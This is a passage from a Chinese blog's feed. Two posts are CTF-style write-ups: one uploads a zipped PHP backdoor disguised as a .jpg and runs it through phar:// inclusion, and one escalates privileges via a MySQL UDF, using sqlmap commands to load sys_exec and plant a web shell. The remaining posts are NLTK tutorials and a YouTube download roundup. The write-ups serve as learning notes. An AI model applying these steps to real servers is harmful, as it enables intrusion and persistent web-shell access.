+<p>排除上面的测试结果只能测试其它的，于是开始测试file://（无效），SMB(本地可行，本地环境不行)，ssh2://(不行)，当时测试了很多环境没搞定，暂时就没搞了。「在这里备注下：发现digitalocean开一个临时的VPS来玩比赛挺好的，随时开关也不怎么费钱，还公网IP」；</p>
+
+<p>后来内部有人提测试下phar://，好吧，厚着脸皮再玩下，其实原来在开发yii2的时候有使用composer这个工具，貌似也是phar的后缀，没怎么注意，一查吓一跳，结果phar是php5.3以后引入的，其实就是一个zip打包的文件，这。。。</p>
+
+<p>果断下载一个backdoor，然后压缩为zip，然后修改后缀为.jpg，上传成功并得到目标文件地址，整个过程可以这样子描述：</p>
+
+<pre><code>phpspy.php-&gt;x.php-&gt;x.zip-&gt;x.jpg-&gt;upload-&gt;xsssa.jpg
+</code></pre>
+
+<p>于是构造路径并通过phar://进行访问，你猜怎么着，居然成功了，顺利得到flag：</p>
+
+<p><a href="http://54.65.205.135/owlur/index.php?page=phar:///var/www/owlur/owlur-upload-zzzzzz/O6i51MF.jpg/1">http://54.65.205.135/owlur/index.php?page=phar:///var/www/owlur/owlur-upload-zzzzzz/O6i51MF.jpg/1</a></p>
+
+<p>其中O6i51MF.jpg是一个zip文件，里面有一个1.php的后门。后来听说zip://这样子也可以，so?</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[NLTK笔记:词干提取与词性标注]]></title>
+    <link href="http://blog.ourren.com/blog/2015/03/12/nltk_note_stem_pos_tag/"/>
+    <updated>2015-03-12T00:00:00-07:00</updated>
+    <id>http://blog.ourren.com/blog/2015/03/12/nltk_note_stem_pos_tag</id>
+    <content type="html"><![CDATA[<p>前面虽然对「nltk分句和分词」进行了分析和实现，但是在进一步进行处理之前，我们需要对这些词语进行规范化处理，例如我们需要统一所有单词的大小写，词语时态问题「相同的单词在不同的时态句型中属于不同的单词，我们需要转换为同一单词」等。nltk则针对问题提供了相关的类库，主要有两类操作：词干提取，词性标注。</p>
+
+<h3>词干提取</h3>
+
+<p>词干提取主要是将不同时态的词语转变为单词一般时态，例如seeing->see，extremely->extem，目前提供的类库在一定程度上可以实现这类转换「有些词语暂时不行，主要有些模块是基于字典的」。</p>
+
+<!--more-->
+
+
+<p>nltk提供三种方法可以实现如上功能：Porter、Lancaster、WordNet。使用都相当简单，具体使用方法如下：</p>
+
+<pre><code>#! /usr/bin/env python
+/# encoding: utf-8
+
+"""
+Copyright (c) 2014-2015 ourren
+author: ourren &lt;i@ourren.com&gt;
+"""
+import nltk
+
+def main():
+    print 'enter main...'
+    sentence = "Listen, strange women lying in ponds \
+    distributing swords. Supreme executive power derives \
+    from a mandate from the masses, not from some farcical aquatic ceremony"
+    sentences = nltk.sent_tokenize(sentence)
+    sentences = [nltk.word_tokenize(sent) for sent in sentences]
+    for sent in sentences:
+        # Porter
+        porter = nltk.PorterStemmer()
+        words = [porter.stem(word) for word in sent]
+        print words
+
+        # Lancaster
+        lancaster = nltk.LancasterStemmer()
+        lwords = [lancaster.stem(t) for t in sent]
+        print lwords
+
+        # WordNet
+        wnl = nltk.WordNetLemmatizer()
+        wwrods = [wnl.lemmatize(t) for t in sent]
+        print wwrods
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+
+<h3>词性标注</h3>
+
+<p><a href="http://baike.baidu.com/view/377635.htm">词性</a>指作为划分词类的根据的词的特点。现代汉语的词可以分为两类12种词性。一类是实词：名词、动词、形容词、数词、量词和代词。一类是虚词：副词、介词、连词、助词、拟声词和叹词。因此nltk对应的pos_tag模块也是实现这类功能，将一个句子中的词性进行标注；</p>
+
+<p>nltk中将词汇按它们的词性(parts-of-speec h,POS)分类以及相应的标注它们的过程被称为词性标注(part-of-speech tagging, POS tagging)或干脆简称标注。其中标注结果中缩写词所代表的词性如下：</p>
+
+<pre><code>ADJ     adjective   new, good, high, special, big, local
+ADV     adverb  really, already, still, early, now
+CNJ     conjunction and, or, but, if, while, although
+DET     determiner  the, a, some, most, every, no
+EX      existential there, there’s
+FW      foreign word    dolce, ersatz, esprit, quo, maitre
+MOD     modal verb  will, can, would, may, must, should
+N       noun    year, home, costs, time, education
+NP      proper noun Alison, Africa, April, Washington
+NUM     number  twenty-four, fourth, 1991, 14:24
+PRO     pronoun he, their, her, its, my, I, us
+P       preposition on, of, at, with, by, into, under
+TO      the word to to
+UH      interjection    ah, bang, ha, whee, hmpf, oops
+V       verb    is, has, get, do, make, see, run
+VD      past tense  said, took, told, made, asked
+VG      present participle  making, going, playing, working
+VN      past participle given, taken, begun, sung
+WH      wh determiner   who, which, when, what, where, how
+</code></pre>
+
+<p>下面看具体例如：</p>
+
+<pre><code>def sentence_pos(sentences):
+    for sent in sentences:
+        words = nltk.pos_tag(sent)
+        print words
+</code></pre>
+
+<p>完整代码可以见<a href="https://github.com/ourren/learn_nltk">learn_nltk</a>。</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Linux下MySQL Udf 提权]]></title>
+    <link href="http://blog.ourren.com/blog/2015/03/10/linux_mysql_udf_shell/"/>
+    <updated>2015-03-10T00:00:00-07:00</updated>
+    <id>http://blog.ourren.com/blog/2015/03/10/linux_mysql_udf_shell</id>
+    <content type="html"><![CDATA[<p>前几天做一个小竞赛中有一个题目：给定的测试环境登录页面有POST注入漏洞，于是果断操起sqlmap跑数据，无意中发现当前MySQL连接用户为root，于是想到udf提权「虽然Windows下MySQL提权基本上没问题，但是Linux环境下原来一直没成功过。」，最终成功获取root权限「主要问题在于MySQL是以root权限运行」，记录笔记如下，方便以后查阅：</p>
+
+<h3>具体步骤如下</h3>
+
+<ol>
+<li><p>找到MySQL插件目录:</p>
+
+<pre><code> python sqlmap.py -u 'http://xxxx' --sql-shell
+
+ show variables like "%plugin%";
+</code></pre></li>
+<li><p>利用sqlmap上传 <a href="https://github.com/mysqludf/lib_mysqludf_sys/blob/master/lib_mysqludf_sys.so">lib_mysqludf_sys</a>到MySQL插件目录;</p>
+
+<pre><code> python sqlmap.py -u 'http://xxxx' --file-write=/lib_mysqludf_sys.so 
+ --file-dest=/usr/lib/mysql/plugin/
+</code></pre></li>
+</ol>
+
+
+<!--more-->
+
+
+<p></p>
+
+<ol>
+<li><p>激活存储过程「sys_exec」函数:</p>
+
+<pre><code> python sqlmap.py -u 'http://xxxx' --sql-shell
+
+ CREATE FUNCTION sys_exec RETURNS STRING SONAME lib_mysqludf_sys.so
+
+ SELECT * FROM information_schema.routines
+
+ sys_exec(id);
+</code></pre></li>
+<li><p>也利用sqlmap上传后门程序：</p>
+
+<pre><code> python sqlmap.py -u 'http://xxx'  --file-write=C:/phpspy.php --file-dest=/var/www/spy.php
+</code></pre></li>
+</ol>
+
+
+<h3>测试环境</h3>
+
+<ul>
+<li>Linux Ubuntu 11.04 (Natty Narwhal)</li>
+<li>PHP 5.3.5, Apache 2.2.17</li>
+<li>MySQL 5.0</li>
+</ul>
+
+
+<h3>参考资料</h3>
+
+<ol>
+<li><a href="http://forelsec.blogspot.com/2012/08/solving-pwn0s-v2.html">http://forelsec.blogspot.com/2012/08/solving-pwn0s-v2.html</a></li>
+<li><a href="https://github.com/mysqludf/lib_mysqludf_sys">https://github.com/mysqludf/lib_mysqludf_sys</a></li>
+<li><a href="https://code.google.com/p/mysql-udf-http/">https://code.google.com/p/mysql-udf-http/</a></li>
+</ol>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[NLTK笔记:分句与分词]]></title>
+    <link href="http://blog.ourren.com/blog/2015/02/21/nltk_note_token_sentence/"/>
+    <updated>2015-02-21T00:00:00-08:00</updated>
+    <id>http://blog.ourren.com/blog/2015/02/21/nltk_note_token_sentence</id>
+    <content type="html"><![CDATA[<p>NLTK在数据抓取完成后，你拿到的数据往往是一篇文章或者一大段文字，在进行其他处理之前，你需要先对文章进行切割或者处理(去除多余字符、特殊符号，分句和分词)，分句主要是可以把有些不需要的句子给去掉，比如长度小于10的。</p>
+
+<h4>分句</h4>
+
+<p>分句在nltk中没有提供相关的库来实现，但是我们可以通过python的split等函数快速完成切分任务，主要的分割特征如下：
++ 中文主要有(。？！)这几个句子结尾标志；
++ 英文也差不多(. ? !)；
+使用split函数进行分割，可以得到新的列表，例如下面的函数;</p>
+
+<!--more-->
+
+
+<pre><code>def sentence_split(str_centence):
+    list_ret = list()
+    for s_str in str_centence.split('.'):
+        if '?' in s_str:
+            list_ret.extend(s_str.split('?'))
+        elif '!' in s_str:
+            list_ret.extend(s_str.split('!'))
+        else:
+            list_ret.append(s_str)
+    return list_ret
+</code></pre>
+
+<h4>分词</h4>
+
+<p>分词在NLP处理中运用得最多，但是目前针对英文分词基本上已经成熟，而针对中文的分词技术还在不断发展，对于pythoner而言，主要可以采取如下的分词方法对句子或者段落进行分词：</p>
+
+<ul>
+<li>中文：采用<a href="https://github.com/fxsjy/jieba">jieba</a>进行分词，然后再可以通过NLTK进行词频统计分析，整体而言jieba对中文分词还是可以接受；</li>
+<li>英文：可以直接使用NLTK中nltk.tokenize模块进行分词；</li>
+</ul>
+
+
+<p>中文的分词实例可以参照这篇文章<a href="http://blog.ourren.com/?p=89252">中文分词与词频统计实例</a>,英文的分词示例如下：</p>
+
+<pre><code>import nltk
+
+def main():
+    sentence = """At eight o'clock on Thursday morning Arthur didn't feel very good."""
+    tokens = nltk.word_tokenize(sentence)
+    print tokens
+
+if __name__ == '__main__':
+    main()
+</code></pre>
+
+<h4>特殊字符</h4>
+
+<p>在处理分词或者分句中经常会除去一些特殊符号或者特殊单词，一般可能会用到的python函数：</p>
+
+<ul>
+<li>startswith</li>
+<li>endswith</li>
+<li>contains</li>
+<li>replace</li>
+<li>split</li>
+<li>len</li>
+</ul>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[YouTube视频下载方法汇总]]></title>
+    <link href="http://blog.ourren.com/blog/2015/02/20/youtube_video_download_summary/"/>
+    <updated>2015-02-20T00:00:00-08:00</updated>
+    <id>http://blog.ourren.com/blog/2015/02/20/youtube_video_download_summary</id>
+    <content type="html"><![CDATA[<p>最近一直有人问我YouTube的视频怎么下载，其实在V2EX上也有很多用户讨论这个问题。本文就将这些方法汇总，方便大家查询和参考。</p>
+
+<p>在介绍下载方法之前，首先大家需要明白的是本文针对的是YouTube上的视频，也就是说原始地址都必须是YouTube的视频链接。如果你需要下载的视频在其它网站上，那么你需要判断是否为YouTube视频并且需要找到YouTube的原始链接，其实链接也非常好找，点击播放器右下角的「YouTube」就可以打开YouTube的原始链接，有了这个原始链接就可以采用如下两种方法下载：</p>
+
+<h4>使用下载网站</h4>
+
+<p>「推荐」这种方法简单快捷，懒人必备，整个过程只需要点击几次：</p>
+
+<ul>
+<li>打开<a href="http://www.clipconverter.cc/">http://www.clipconverter.cc/</a>;</li>
+<li>复制需要下载的原始链接到上面网页的输入框选择「continue」;</li>
+<li>选择分辨率，一般果断选1080p;</li>
+<li>点击「start」;</li>
+<li>「download」</li>
+</ul>
+
+
+<!--more-->
+
+
+<p>跟clipconverter类似的网站很多，列举如下：</p>
+
+<ul>
+<li><a href="http://en.savefrom.net/">http://en.savefrom.net/</a>;</li>
+<li><a href="https://d.jaylab.org/">https://d.jaylab.org/</a>;</li>
+<li><a href="http://kej.tw/flvretriever/">http://kej.tw/flvretriever/</a>;</li>
+<li><a href="http://keepvid.com/">http://keepvid.com/</a>;</li>
+</ul>
+
+
+<h4>使用下载工具</h4>
+
+<p>Windows/Linux/Mac上都有对应的下载工具，同时Firefox也有类似的插件可以下载视频；</p>
+
+<ul>
+<li><a href="https://www.4kdownload.com/">4kdownload</a>支持多平台;</li>
+<li><a href="http://rg3.github.io/youtube-dl/">youtube-dl   </a>，支持多平台；</li>
+<li>Firefox + video downloadhelper;</li>
+</ul>
+
+
+<h4>国内视频下载</h4>
+
+<p>最后补充下国内视频「youku、tudou、ku6」等网站可以采用硕鼠进行下载：</p>
+
+<ul>
+<li><a href="http://www.flvcd.com/">硕鼠</a>，同样的使用方法，复制链接即可下载;</li>
+</ul>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[NLTK笔记:简介与环境搭建]]></title>
+    <link href="http://blog.ourren.com/blog/2015/02/05/nltk_note_environment_install/"/>
+    <updated>2015-02-05T00:00:00-08:00</updated>
+    <id>http://blog.ourren.com/blog/2015/02/05/nltk_note_environment_install</id>
+    <content type="html"><![CDATA[<h3>NLP与NLTK</h3>
+
+<p>在详细介绍nltk之前，我感觉有必要区分下NLP与NLTK的关系:</p>
+
+<p>NLP是指自然语言处理，英文(Natural Language Processing)，该技术主要解决计算机自动识别和处理人类语言，如何让计算机能够理解我们的语言，从而减少人类的工作量。个人认为其应用场景有如下几点：</p>
+
+<ol>
+<li>个性推荐，需要计算两类物品的相识度和相关度；</li>
+<li>情感分析，用户对商品的评价，网民对帖子或者文章的态度；</li>
+<li>关键字提取，对网络商品的标题提取并分类，自动摘要；</li>
+<li>其它，待补充；</li>
+</ol>
+
+
+<p>并且该相关技术最近几年热度非常高，计算机行业内研究的人也越来越多，但是不同语言的处理差异很大，比如英文的各种语言处理库基本上已经成熟，而中文的语言处理则发展缓慢；</p>
+
+<!--more-->
+
+
+<p>而NLTK是斯坦福大学开发的处理自然语言的python库，(斯坦福大学自然语言处理组是世界知名的NLP研究小组，目前course上他们的课程暂时还没看开放)，因此我们可以借助NLTK库的一些功能来处理各种事情。事实上NLTK提供的功能相当全，主要包含如下功能：</p>
+
+<ol>
+<li>语料库：提供了经典书籍，词典，演讲，网络语言，论坛等各种语料库；</li>
+<li>断句与分词：可以方便地对文章，段落进行分词；</li>
+<li>词频统计：计算句子或者文章中每个单词的频率；</li>
+<li>同义词与词态：单词的同义词「WordNet」和单词词态「过去式，进行时等」的还原；</li>
+<li>词性的标注：动词，名词，形容词和副词等的标注；</li>
+<li>分类算法：例如常见的信息熵，朴素贝叶斯算法，最大信息熵模型等；</li>
+<li>情感分析：当然这个其实是利用语料库和分类算法的一种应用场景；</li>
+<li>其它:待补充；</li>
+</ol>
+
+
+<p>说了这么多，NLTK其实主要是针对英语进行处理，对中文支持不行，其它博客也有<a href="http://www.52nlp.cn/python%E8%87%AA%E7%84%B6%E8%AF%AD%E8%A8%80%E5%A4%84%E7%90%86%E5%AE%9E%E8%B7%B5-%E5%9C%A8nltk%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%96%AF%E5%9D%A6%E7%A6%8F%E4%B8%AD%E6%96%87%E5%88%86%E8%AF%8D%E5%99%A8">改造NLTK支持中文的博文</a>，NLP和NLTK的简介基本上就扯这么多。</p>
+
+<h3>环境搭建</h3>
+
+<p>NLTK的安装步骤非常简单，具体参照<a href="http://www.nltk.org/install.html">官网</a>：</p>
+
+<pre><code>#Mac/Unix
+Install Setuptools: http://pypi.python.org/pypi/setuptools
+Install Pip: run sudo easy_install pip
+Install Numpy (optional): run sudo pip install -U numpy
+Install NLTK: run sudo pip install -U nltk
+Test installation: run python then type import nltk
+</code></pre>
+
+<p>需要注意的是上面只安装了nltk的主库，语料库这些都没有安装，可以通过如下的命令安装语料库，当然这些语料库也可以在需要的时候再进行安装，在python命令行中运行如下命令：</p>
+
+<pre><code>import nltk  
+nltk.download()  
+</code></pre>
+
+<p>然后会弹出下载对话框，需要你选择语料库进行下载。在这里补充说明下什么是语料库：所谓语料库就是别人或者官方收集的测试数据，而这些数据一般已经进行了特殊处理，方便你在处理各种数据的时候可以参照这些语料库进行分析，当然你也可以加入自己的语料库。</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[NLTK笔记:系列文章概述]]></title>
+    <link href="http://blog.ourren.com/blog/2015/02/02/nltk_note_content_list/"/>
+    <updated>2015-02-02T00:00:00-08:00</updated>
+    <id>http://blog.ourren.com/blog/2015/02/02/nltk_note_content_list</id>
+    <content type="html"><![CDATA[<p>从本系列文章中，我将最近学习自然语言处理中的NLTK库的相关技术进行分享，帮助初学者熟悉NLTK库的相关模块和功能，希望能够让你轻松地操作相关模块，完成自己的需求任务。</p>
+
+<h3>文章目录</h3>
+
+<p>系列文章首先会介绍NLTK的相关概念，然后介绍NLTK中比较常用的几个模块，争取每个篇文章都配上实例代码，最后用一个完整的实例进行讲解，目前暂定的目录如下：</p>
+
+<!-- more -->
+
+
+<ol>
+<li>NLTK相关概念与环境搭建；</li>
+<li>NLTK之分句；</li>
+<li>NLTK之分词；</li>
+<li>NLTK之句子分析；</li>
+<li>NLTK之词性分析；</li>
+<li>NLTK之词态分析；</li>
+<li>NLTK之感情分析；</li>
+<li>NLTK之关键字提取；</li>
+<li>NLTK之分类算法；</li>
+<li>&hellip;&hellip;</li>
+</ol>
+
+
+<p>暂时只考虑到以上的几个部分，以后有特别需要的部分再继续补上，其中本系列文章的技术主要参考两本书籍：</p>
+
+<ol>
+<li><a href="http://www.nltk.org/book/">Natural Language Processing With Python</a></li>
+<li><a href="http://vdisk.weibo.com/s/qdxg3WEhv6A2">Machine Learning for Hackers</a></li>
+</ol>
+
+]]></content>
+  </entry>
+  
+</feed>
